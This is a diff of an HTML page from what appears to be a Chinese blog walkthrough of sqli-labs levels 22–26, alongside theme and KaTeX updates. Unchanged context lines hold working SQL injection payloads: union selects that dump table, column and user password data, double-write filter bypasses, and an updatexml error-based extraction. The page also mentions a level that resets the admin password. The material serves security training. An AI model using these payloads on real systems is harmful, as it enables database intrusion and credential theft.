-<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271249369.png"
+<h2 id="less---22">less - 22
+</h2><p>闭合符为<code>&quot;</code>，方法同<code>less-21</code></p>
+<h2 id="less---23">less - 23
+</h2><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271249369.png"
 	
 	
 	
@@ -862,8 +835,8 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;</span><span class="k">security</span><span class="s1">&#39;),3 or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;</span><span class="k">security</span><span class="s1">&#39; and table_name=&#39;</span><span class="n">users</span><span class="s1">&#39; ),3 or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,(select group_concat(password,username) from users),3 or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
-</span></span></span></code></pre></div><h2 id="less---24">less - 24</h2>
-<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271309455.png"
+</span></span></span></code></pre></div><h2 id="less---24">less - 24
+</h2><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271309455.png"
 	
 	
 	
@@ -923,8 +896,8 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 	
 ></p>
 <p>可以看到我们成功修改了<code>admin</code>的密码，之后就可以用它的权限登录。</p>
-<h2 id="less---25">less - 25</h2>
-<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271344216.png"
+<h2 id="less---25">less - 25
+</h2><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271344216.png"
 	
 	
 	
@@ -936,11 +909,11 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 ></p>
 <p>这关将<code>or</code>和<code>and</code>替换为空并且无论大小写，但是它只替换了一次，所以我们可以双写绕过，如果注入语句中含有<code>or</code>，我们可以将其写为<code>oorr</code>，这样即使替换为空，依然得到<code>or</code></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">2</span><span class="s1">&#39; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#39;</span><span class="k">security</span><span class="s1">&#39;--+
-</span></span></span></code></pre></div><h2 id="less---25a">less - 25a</h2>
-<p>变成了数字型，方法同上</p>
+</span></span></span></code></pre></div><h2 id="less---25a">less - 25a
+</h2><p>变成了数字型，方法同上</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">2</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">infoorrmation_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="c1">--+
-</span></span></span></code></pre></div><h2 id="less---26">less - 26</h2>
-<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405300042352.png"
+</span></span></span></code></pre></div><h2 id="less---26">less - 26
+</h2><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405300042352.png"
 	
 	
 	
@@ -969,9 +942,9 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 </span></span></span><span class="line"><span class="cl"><span class="w"> 
 </span></span></span><span class="line"><span class="cl"><span class="w"> 
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||&#39;</span><span class="mi">0</span><span class="w">   </span><span class="err">爆密码账户</span><span class="w">
-</span></span></span></code></pre></div><h2 id="总结">总结</h2>
-<h3 id="get传参和post传参注释符使用的不同">get传参和post传参注释符使用的不同</h3>
-
+</span></span></span></code></pre></div><h2 id="总结">总结
+</h2><h3 id="get传参和post传参注释符使用的不同">get传参和post传参注释符使用的不同
+</h3>
 </section>
 
 
@@ -996,18 +969,19 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
     
         <link 
                 rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css"integrity="sha256-J&#43;iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s="crossorigin="anonymous"
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
             ><script 
-                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js"integrity="sha256-InsNdER1b2xUewP&#43;pKCUJpkhiqwHgqiPXDlIk7GzBu4="crossorigin="anonymous"
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
                 defer
                 >
             </script><script 
-                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js"integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI="crossorigin="anonymous"
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
                 defer
                 >
             </script><script>
     window.addEventListener("DOMContentLoaded", () => {
-        renderMathInElement(document.querySelector(`.article-content`), {
+	const mainArticleElement = document.querySelector(".main-article");
+        renderMathInElement(mainArticleElement, {
             delimiters: [
                 { left: "$$", right: "$$", display: true },
                 { left: "$", right: "$", display: false },
@@ -1017,6 +991,7 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
             ignoredClasses: ["gist"]
         });})
 </script>
+
     
 </article>
 
@@ -1080,12 +1055,14 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
     <section class="copyright">
         &copy; 
         
-        2024 Winglet
+            2024 - 
+        
+        2025 Winglet
     </section>
     
     <section class="powerby">
-        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.21.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
     </section>
 </footer>
 
@@ -1174,7 +1151,7 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
                 src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                 
                 >
-            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
 <script>
     (function () {
         const customFont = document.createElement('link');
